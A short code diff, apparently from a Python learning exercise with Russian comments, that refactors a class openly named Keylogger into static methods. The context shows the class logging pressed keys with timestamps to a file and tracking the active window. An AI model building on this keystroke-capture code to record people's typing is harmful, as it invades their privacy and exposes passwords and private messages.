@@ -34,8 +34,8 @@ class Keylogger:
         self.key = None
         self.name_last_active_window = None
 
-
-    def on_release(self, key):
+    @staticmethod
+    def on_release(key):
         if key == Key.esc:
             return False
 
@@ -52,13 +52,14 @@ class Keylogger:
         f.write(f"{self.now_time()} {self.get_key(key)}\n")
         f.close()
 
-    @staticmethod  # пример декорации
+    @staticmethod
     def now_time():
         # Его можно инкапсулировать, так как он не использует свойства класса и метода
         time = datetime.now().time().replace(microsecond=0)
         return str(time)
 
-    def get_active_window(self):
+    @staticmethod
+    def get_active_window():
         """
         Также можно использовать комментарии
 
